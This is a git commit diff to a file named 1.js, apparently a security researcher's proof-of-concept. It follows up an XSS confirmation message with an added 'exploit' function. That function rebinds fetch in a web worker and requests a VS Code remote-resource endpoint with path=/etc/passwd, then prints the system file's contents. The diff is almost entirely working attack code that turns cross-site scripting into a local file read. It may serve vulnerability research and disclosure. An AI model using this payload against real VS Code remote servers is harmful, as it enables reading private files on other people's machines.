ed2b903d1494ba3d7e7f5881c185bd13482481a0
Sudhanshu Rajbhar <31372554+Sudistark@users.noreply.github.com>
2024-07-23 11:07:39 +0530

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,9 @@
 console.dir("Shirley: Hey sudi, I love you , here is your XSS in " + origin)
+globalThis.fetch = WorkerGlobalScope.prototype.fetch.bind(globalThis)
+
+async function exploit() {
+    const page_resp = await fetch("/stable-6c3eb9ae5f4d44be88307d2137e8364e0e36891a/vscode-remote-resource?path=/etc/passwd&tkn=")
+    const text = await page_resp.text()
+    console.dir(text)
+    }
+exploit()
